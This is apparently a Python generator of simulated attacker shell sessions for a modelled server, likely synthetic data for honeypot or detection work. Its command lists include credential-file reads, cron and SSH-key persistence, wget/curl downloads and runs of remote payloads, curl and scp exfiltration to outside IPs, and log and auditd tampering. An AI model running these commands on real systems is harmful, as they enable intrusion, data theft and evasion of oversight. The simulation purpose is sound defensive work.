import random


RECON_COMMANDS = [
    "whoami", "id", "hostname", "pwd", "uname -a", "cat /etc/os-release",
    "uptime", "df -h", "free -m", "env", "printenv", "groups", "who", "w", "last",
]

FILE_DISCOVERY_COMMANDS = [
    "ls", "ls -la", "find / -name '*.env' 2>/dev/null",
    "find / -name '*config*' 2>/dev/null", "find / -name '*.sql' 2>/dev/null",
    "find / -name '*.bak' 2>/dev/null", "cat /etc/passwd", "history",
    "ls ~/.ssh", "cat ~/.ssh/authorized_keys",
]

SERVICE_ENUMERATION_COMMANDS = [
    "ps aux", "netstat -tulpn", "ss -tulpn",
    "systemctl status nginx", "systemctl status apache2", "systemctl status mysql",
    "systemctl status mariadb", "systemctl status mongodb", "systemctl status postgresql",
    "systemctl list-units --type=service --state=running",
]

GENERIC_CREDENTIAL_COMMANDS = [
    "cat .env", "grep -R \"password\" . 2>/dev/null",
    "grep -R \"DB_PASSWORD\" . 2>/dev/null", "grep -R \"SECRET\" . 2>/dev/null",
    "cat /backup/old.env", "cat /backup/db_backup.sql",
]

PRIVILEGE_ESCALATION_COMMANDS = [
    "sudo -l", "find / -perm -4000 -type f 2>/dev/null", "getcap -r / 2>/dev/null",
    "cat /etc/sudoers", "ls -la /etc/cron.d", "ls -la /tmp", "uname -r",
]

PERSISTENCE_COMMANDS = [
    "crontab -l", "echo '* * * * * /tmp/.x/update.sh' | crontab -",
    "mkdir -p /tmp/.x",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfakekey attacker@host' >> ~/.ssh/authorized_keys",
    "systemctl list-timers", "ls -la ~/.ssh",
]

MALWARE_STAGING_COMMANDS = [
    "wget http://185.62.190.12/bot.sh", "curl -O http://45.91.82.10/payload.sh",
    "chmod +x bot.sh", "chmod +x payload.sh", "./bot.sh", "./payload.sh",
    "nohup ./bot.sh >/dev/null 2>&1 &",
]

EXFILTRATION_COMMANDS = [
    "scp /tmp/www.tar.gz attacker@192.168.1.50:/tmp/",
    "curl -F file=@/tmp/www.tar.gz http://45.91.82.10/upload",
    "base64 /backup/old.env",
]

DEFENSE_EVASION_COMMANDS = [
    "unset HISTFILE", "history -c", "rm -f ~/.bash_history",
    "rm -f /var/log/auth.log", "kill -9 $(pidof auditd)",
]


def choose_existing_config_command(world):
    for filename in world.filesystem[world.web_root]:
        if filename in ["config.php", "wp-config.php", "app.js", "server.js", "package.json"]:
            return f"cat {filename}"
    return "cat .env"


def stack_specific_credential_commands(world):
    commands = list(GENERIC_CREDENTIAL_COMMANDS)

    for filename in world.filesystem[world.web_root]:
        if filename in ["config.php", "wp-config.php", "app.js", "server.js", "package.json"]:
            commands.append(f"cat {filename}")

    return commands


def world_relevant_exfil_command(world):
    if world.web_root == "/var/www/html":
        return "tar -czf /tmp/www.tar.gz /var/www/html 2>/dev/null"
    if world.web_root == "/opt/app":
        return "tar -czf /tmp/app.tar.gz /opt/app 2>/dev/null"
    if world.web_root == "/srv/client-portal":
        return "tar -czf /tmp/portal.tar.gz /srv/client-portal 2>/dev/null"
    return f"tar -czf /tmp/app.tar.gz {world.web_root} 2>/dev/null"


def build_attack_session(world, seed=None):
    rng = random.Random(seed)
    commands = []

    commands.extend(rng.sample(RECON_COMMANDS, k=5))
    commands.append("ls -la")

    commands.append(f"cd {world.web_root}")
    commands.append("pwd")
    commands.append("ls -la")

    if ".env" in world.filesystem[world.web_root]:
        commands.append("cat .env")

    commands.append(choose_existing_config_command(world))

    credential_commands = stack_specific_credential_commands(world)
    commands.extend(rng.sample(credential_commands, k=min(4, len(credential_commands))))

    commands.extend(rng.sample(FILE_DISCOVERY_COMMANDS, k=5))

    service_checks = [
        cmd for cmd in SERVICE_ENUMERATION_COMMANDS
        if any(service in cmd for service in world.services)
        or cmd in ["ps aux", "netstat -tulpn", "ss -tulpn", "systemctl list-units --type=service --state=running"]
    ]
    commands.extend(rng.sample(service_checks, k=min(4, len(service_checks))))

    if rng.random() < 0.8:
        commands.extend(rng.sample(PRIVILEGE_ESCALATION_COMMANDS, k=4))

    if rng.random() < 0.7:
        commands.extend(rng.sample(MALWARE_STAGING_COMMANDS, k=4))

    if rng.random() < 0.7:
        commands.extend(rng.sample(PERSISTENCE_COMMANDS, k=4))

    if rng.random() < 0.6:
        commands.append(world_relevant_exfil_command(world))
        commands.extend(rng.sample(EXFILTRATION_COMMANDS, k=3))

    if rng.random() < 0.5:
        commands.extend(rng.sample(DEFENSE_EVASION_COMMANDS, k=3))

    return commands
